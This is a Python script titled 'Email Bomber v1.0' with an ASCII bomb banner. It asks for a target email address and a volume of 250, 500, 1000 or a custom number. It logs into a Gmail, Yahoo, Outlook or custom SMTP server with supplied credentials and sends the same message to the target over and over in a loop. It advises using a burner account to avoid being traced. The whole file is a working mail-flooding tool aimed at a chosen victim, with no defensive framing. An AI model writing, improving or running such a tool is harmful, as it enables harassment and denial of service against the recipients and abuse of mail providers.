import smtplib
import sys


class Bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(Bcolors.RED + '''                           
    
                                 _ ___                 _ _ 
                                |  ___|               (_) |
                                | |___ _ __ ___   __ _ _| |
                                | |___| '_ ` _ \ / _` | | |
                                | |___  | | | | | (_| | | |
                                |_____|_| |_| |_|\__,_|_|_|
                                     _                     _     
                                    | |                   | |    
                                    | |__   ___  _ __ ___ | |__  
                                    | '_ \ / _ \| '_ ` _ \| '_ \ 
                                    | |_) | (_) | | | | | | |_) |
                                    |_.__/ \___/|_| |_| |_|_.__/   v1.0
                                                                        by
                                           . . .                           MADDOG
                                            \|/                          
                                          `--+--'                           
                                            /|\                          
                                           ' | '                         
                                             |                                   
                                         ,--'#`--.                       
                                         |#######|                      
                                      _.-'#######`-._                 
                                   ,-'###############`-.                 
                                 ,'#####################`,              
                                /#########################\                             
                               |###########################|            
                              |#############################|            
                              |#############################|            
                              |#############################|            
                              |#############################|            
                               |###########################|             
                                \#########################/              
                                 `.#####################,'               
                                   `._###############_,'                                     
                                      `--..#####..--'                                     ,,--.
*_______________________________________________________________________________________,'(Bomb)
                                                                                           `---' ''')


class EmailBomber:
    count = 0

    def __init__(self):
        try:
            print(Bcolors.RED + '\n+[+[+[+[+[+[ Initializing program ]+]+]+]+]+]+')
            self.target = str(input(Bcolors.GREEN + 'Enter target email: '))
            self.mode = int(input(Bcolors.GREEN + 'Enter Bomb mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom): '))

            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. Goodbye.')
                sys.exit(1)

        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(Bcolors.RED + '\n+[+[+[+[+[+[ Setting up Bomb ]+]+]+]+]+]+')
            self.amount = None

            if self.mode == int(1):
                self.amount = int(1000)

            elif self.mode == int(2):
                self.amount = int(500)

            elif self.mode == int(3):
                self.amount = int(250)

            else:
                self.amount = int(input(Bcolors.GREEN + 'Choose CUSTOM amount <: '))
            print(Bcolors.RED + f'\n+[+[+[+[+[+[ Bomb mode selected: {self.mode} and {self.amount} emails ]+]+]+]+]+]+')

        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(Bcolors.RED + '\nTip: Use burner email!...   +[+[+[+[+[+[ Setup Email ]+]+]+]+]+]+ ')
            self.server = str(input(Bcolors.GREEN + 'Enter email / select options - 1: G-mail 2: Yahoo 3: Outlook: '))
            pre_made = ['1', '2', '3']
            default_port = True

            if self.server not in pre_made:
                default_port = False
                self.port = int(input(Bcolors.GREEN + 'Enter port number: '))

            if default_port:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'

            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'

            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAdder = str(input(Bcolors.GREEN + 'Enter from address: '))
            self.fromPwd = str(input(Bcolors.GREEN + 'Enter from password: '))
            self.subject = str(input(Bcolors.GREEN + 'Enter subject: '))
            self.message = str(input(Bcolors.GREEN + 'Enter message: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAdder, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAdder, self.fromPwd)

        except Exception as e:
            print(f'ERROR:{e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAdder, self.target, self.msg)
            self.count += 1
            print(Bcolors.YELLOW + f'BOMB: {self.count}')

        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(Bcolors.RED + '\n+[+[+[+[+[+[ Attacking... ]+]+]+]+]+]+')

        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print('\n+[+[+[+[+[+[ Attacking Finished ]+]+]+]+]+]+')
        sys.exit(0)


if __name__ == '__main__':
    banner()
    bomb = EmailBomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()